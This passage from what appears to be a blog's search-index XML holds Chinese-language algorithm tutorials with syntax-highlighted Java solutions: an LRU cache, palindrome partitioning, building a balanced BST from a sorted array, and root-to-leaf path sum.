keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// detach</span>      cur<span class="token punctuation">.</span>prev<span class="token punctuation">.</span>next <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>prev <span class="token operator">=</span> cur<span class="token punctuation">.</span>prev<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// attach</span>      cur<span class="token punctuation">.</span>next <span class="token operator">=</span> head<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>prev <span class="token operator">=</span> cur<span class="token punctuation">;</span>      head<span class="token punctuation">.</span>next <span class="token operator">=</span> cur<span class="token punctuation">;</span>      cur<span class="token punctuation">.</span>prev <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">LRUCache</span><span class="token punctuation">(</span><span class="token keyword">int</span> capacity<span class="token punctuation">)</span> <span class="token punctuation">{</span>      Node cur <span class="token operator">=</span> head<span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> capacity<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        cur<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> cur<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      cur<span class="token punctuation">.</span>next <span class="token operator">=</span> head<span class="token punctuation">;</span>      head<span class="token punctuation">.</span>prev <span class="token operator">=</span> cur<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>      Node cur <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">move2Head</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> cur<span class="token punctuation">.</span>val<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">put</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Node cur <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        cur<span class="token punctuation">.</span>val <span class="token operator">=</span> value<span class="token punctuation">;</span>        <span class="token function">move2Head</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>head<span class="token punctuation">.</span>val <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> map<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        head<span class="token punctuation">.</span>key <span class="token operator">=</span> key<span class="token punctuation">;</span>        head<span class="token punctuation">.</span>val <span class="token operator">=</span> value<span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> head<span class="token punctuation">)</span><span class="token punctuation">;</span>        head <span class="token operator">=</span> head<span class="token punctuation">.</span>prev<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>回文分割</title>
      <link href="/2018/12/09/suan-fa/hui-wen-fen-ge/"/>
      <url>/2018/12/09/suan-fa/hui-wen-fen-ge/</url>
      
        <content type="html"><![CDATA[<h2 id="回文分割"><a href="#回文分割" class="headerlink" title="回文分割"></a>回文分割</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个字符串，你要把它分割成子串，并且每个子串都是回文串。你要返回所有可能的子串集合。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的字符串是：aad它有两种可能的分割方法。一种是分割成 aa 和 d。aa 是回文串，d 作为单个字符也是回文串。另一种是分割成 a，a 和 d，3 个子串都是单字符的回文串。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">partition</span><span class="token punctuation">(</span>String s<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> d<span class="token punctuation">,</span>                         List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>String<span class="token operator">>></span> result<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>String<span class="token operator">></span> elem<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>start <span class="token operator">>=</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> end <span class="token operator">=</span> start<span class="token punctuation">;</span> end <span class="token operator">&lt;</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>end<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>d<span class="token punctuation">[</span>start<span class="token punctuation">]</span><span class="token punctuation">[</span>end<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          elem<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">partition</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> end<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> d<span class="token punctuation">,</span> result<span class="token punctuation">,</span> elem<span class="token punctuation">)</span><span class="token punctuation">;</span>          elem<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>elem<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// T: O(1)</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(2^n), Space: O(n^2)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>String<span class="token operator">>></span> <span class="token function">partition</span><span class="token punctuation">(</span>String s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>String<span class="token operator">>></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> null <span class="token operator">||</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">boolean</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> j<span class="token punctuation">)</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> j<span class="token punctuation">)</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">partition</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> d<span class="token punctuation">,</span> result<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用有序数组构建二叉搜索树</title>
      <link href="/2018/12/09/suan-fa/er-cha-shu/yong-you-xu-shu-zu-gou-jian-er-cha-sou-suo-shu/"/>
      <url>/2018/12/09/suan-fa/er-cha-shu/yong-you-xu-shu-zu-gou-jian-er-cha-sou-suo-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="用有序数组构建二叉搜索树"><a href="#用有序数组构建二叉搜索树" class="headerlink" title="用有序数组构建二叉搜索树"></a>用有序数组构建二叉搜索树</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个<strong>递增排序</strong>的数组，你要用它构建一棵平衡的二叉搜索树。所谓平衡，是指对于这棵二叉搜索树上的每一个节点，它左右子树的高度差不能大于 1。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的递增数组是：1, 2, 4, 8, 16一种可能的构建方式是：   4  / \ 1   8  \   \   2  16首先，这是一棵二叉搜索树。对于任意的一个节点，它左子树上的数字都小于它；右子树上的数字都大于它。另外这棵树是平衡的，因为任何一个节点的左右子树高度差都不大于 1 。当然，这不是唯一的构建方式。比如也可以构建成：<span class="token code keyword">     4</span><span class="token code keyword">    / \</span>   2   8  /     \ 1      16我们只需要返回任意一个平衡的二叉搜索树即可。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> TreeNode <span class="token function">sortedArrayToBST</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">,</span> <span class="token keyword">int</span> end<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>start <span class="token operator">></span> end<span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> start <span class="token operator">+</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>    TreeNode root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeNode</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    root<span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token function">sortedArrayToBST</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> start<span class="token punctuation">,</span> mid<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    root<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token function">sortedArrayToBST</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> root<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(log(n))</span>  <span class="token keyword">public</span> TreeNode <span class="token function">sortedArrayToBSTRecursive</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">sortedArrayToBST</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> <span class="token keyword">class</span> <span class="token class-name">Item</span> <span class="token punctuation">{</span>    TreeNode parent<span class="token punctuation">;</span>    <span class="token keyword">int</span> start<span class="token punctuation">,</span> end<span class="token punctuation">;</span>    <span class="token keyword">boolean</span> isLeft<span class="token punctuation">;</span>    <span class="token function">Item</span><span class="token punctuation">(</span>TreeNode parent<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">,</span> <span class="token keyword">int</span> end<span class="token punctuation">,</span> <span class="token keyword">boolean</span> isLeft<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>parent <span class="token operator">=</span> parent<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>start <span class="token operator">=</span> start<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>end <span class="token operator">=</span> end<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>isLeft <span class="token operator">=</span> isLeft<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> TreeNode <span class="token function">sortedArrayToBSTIterative</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>    Stack<span class="token operator">&lt;</span>Item<span class="token operator">></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    TreeNode dummy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeNode</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Item</span><span class="token punctuation">(</span>dummy<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      Item item <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span>start <span class="token operator">&lt;=</span> item<span class="token punctuation">.</span>end<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> mid <span class="token operator">=</span> item<span class="token punctuation">.</span>start <span class="token operator">+</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span>end <span class="token operator">-</span> item<span class="token punctuation">.</span>start<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>        TreeNode child <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeNode</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span>isLeft<span class="token punctuation">)</span> item<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>left <span class="token operator">=</span> child<span class="token punctuation">;</span>        <span class="token keyword">else</span> item<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>right <span class="token operator">=</span> child<span class="token punctuation">;</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Item</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> item<span class="token punctuation">.</span>start<span class="token punctuation">,</span> mid<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Item</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> item<span class="token punctuation">.</span>end<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> dummy<span class="token punctuation">.</span>left<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路径和是否等于给定值</title>
      <link href="/2018/12/09/suan-fa/lu-jing-he-shi-fou-deng-yu-gei-ding-zhi/"/>
      <url>/2018/12/09/suan-fa/lu-jing-he-shi-fou-deng-yu-gei-ding-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="路径和是否等于给定值"><a href="#路径和是否等于给定值" class="headerlink" title="路径和是否等于给定值"></a>路径和是否等于给定值</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一棵二叉树和一个整数，你要判断这棵二叉树上是否存在一条从根到叶子节点的路径，这条路径上所有节点中的数字相加等于给你的整数。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的二叉树是：<span class="token code keyword">    1</span>  /   \ 2     4<span class="token code keyword">      / \</span><span class="token code keyword">     8  16</span>给你的整数是 13。在这棵二叉树中存在一条从根到叶子节点的路径 1->4->8，路径上的数字加起来等于 13，于是要返回 true。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">hasPathSumRecursive</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">,</span> <span class="token keyword">int</span> sum<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token punctuation">.</span>left <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> root<span class="token punctuation">.</span>right <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> root<span class="token punctuation">.</span>val <span class="token operator">==</span> sum<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">hasPathSumRecursive</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">,</span> sum <span class="token operator">-</span> root<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token operator">||</span>      <span class="token function">hasPathSumRecursive</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">,</span> sum <span class="token operator">-</span> root<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">hasPathSumIterative</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">,</span> <span class="token keyword">int</span> sum<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    Stack<span class="token operator">&lt;</span>TreeNode<span class="token operator">></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Stack<span class="token operator">&lt;</span>Integer<span class="token operator">></span> sumStack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>    sumStack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      TreeNode n <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> s <span class="token operator">=</span> sumStack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>n<span class="token punctuation">.</span>left <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> n<span class="token punctuation">.</span>right <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> n<span class="token punctuation">.</span>val <span class="token operator">==</span> s<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>n<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span> sumStack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>s <span class="token operator">-</span> n<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>n<span class="token punctuation">.</span>right <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span> sumStack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>s <span class="token operator">-</span> n<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
